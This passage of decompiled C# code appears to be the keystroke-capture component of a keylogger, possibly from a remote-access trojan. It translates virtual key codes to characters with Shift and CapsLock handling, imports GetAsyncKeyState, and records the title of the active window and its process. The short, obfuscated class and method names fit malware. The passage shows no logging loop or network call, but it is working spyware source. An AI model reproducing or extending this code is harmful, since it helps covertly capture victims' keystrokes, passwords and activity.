          case 165:
            return "{ALT}";
          case 186:
            return B.Key.u() ? ":" : ";";
          case 187:
            return B.Key.u() ? "+" : "=";
          case 188:
            return B.Key.u() ? "<" : ",";
          case 189:
            return B.Key.u() ? "_" : "-";
          case 190:
            return B.Key.u() ? ">" : ".";
          case 191:
            return B.Key.u() ? "?" : "/";
          case 192:
            return B.Key.u() ? "~" : "`";
          case 219:
            return B.Key.u() ? "{" : "[";
          case 220:
            return B.Key.u() ? "|" : "\\";
          case 221:
            return B.Key.u() ? "}" : "]";
          case 222:
            return B.Key.u() ? "\"" : "'";
          case 226:
            return B.Key.u() ? "|" : "\\";
          default:
            if (Strings.InStr(String1, Strings.ChrW(i).ToString().ToLower()) <= 0)
              return "";
            if (!B.Key.u())
              return Strings.ChrW(i).ToString().ToLower();
            try
            {
              int index = 0;
              while (Conversions.ToDouble(Strings.ChrW(i).ToString()) != (double) index)
              {
                checked { ++index; }
                if (index > 9)
                  goto label_59;
              }
              return Conversions.ToString(str[index]);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
label_59:
            return Strings.ChrW(i).ToString().ToUpper();
        }
      }

      public static bool u() => B.Key.K.CapsLock & !B.Key.K.ShiftKeyDown || !B.Key.K.CapsLock & B.Key.K.ShiftKeyDown;

      [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern short GetAsyncKeyState(int vKey);

      [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern IntPtr GetForegroundWindow();

      [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

      [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

      [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int GetWindowTextLength(long hwnd);

      public static string w()
      {
        string str;
        try
        {
          IntPtr foregroundWindow = B.Key.GetForegroundWindow();
          if (foregroundWindow == IntPtr.Zero)
          {
            str = " ";
          }
          else
          {
            int windowTextLength = B.Key.GetWindowTextLength((long) foregroundWindow);
            string WinTitle = Strings.StrDup(checked (windowTextLength + 1), "*");
            B.Key.GetWindowText(foregroundWindow, ref WinTitle, checked (windowTextLength + 1));
            int lpdwProcessID;
            B.Key.GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
            if (lpdwProcessID == 0)
            {
              str = WinTitle;
            }
            else
            {
              try
              {
                str = Process.GetProcessById(lpdwProcessID).MainWindowTitle;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                str = WinTitle;
                ProjectData.ClearProjectError();
              }
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          str = " ";
          ProjectData.ClearProjectError();
        }
        return str;
      }
    }
  }
}
